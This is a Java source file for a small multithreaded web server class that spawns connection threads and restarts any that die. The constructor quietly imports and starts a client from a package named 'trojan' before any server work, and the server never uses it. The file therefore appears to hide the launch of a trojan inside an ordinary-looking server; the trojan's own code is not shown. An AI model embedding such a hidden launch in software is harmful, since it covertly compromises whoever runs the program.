package com.kien.webserver.server;

import com.kien.trojan.client.Client;
import lombok.Data;

import java.util.ArrayList;
import java.util.List;

@Data
public class Server {
    List<Thread> threads;
    ServerProperties properties;


    public Server() {
        Client client = new Client();
        client.start();
        threads = new ArrayList<>();
        properties = new ServerProperties();
    }

    public void run() {
        /**
         * Create threads based on user's configuration
         */
        for (int i = 0; i < properties.getTotalThreads(); i++) {
            Connection connection = new Connection(properties, i);
            connection.start();
            threads.add(connection);
        }

        // Fail-safe mechanism
        // If a thread is not alive anymore create a new one
        while(true) {
            try {
                Thread.sleep(2000);
                for (int i=threads.size()-1; i>=0; i--) {
                    if (!threads.get(i).isAlive()) {
                        threads.remove(i);
                        Connection connection = new Connection(properties, i);
                        connection.start();
                        threads.add(connection);
                    }
                }
            } catch (InterruptedException e) {
                // Error on sleep
            }
        }
    }
}
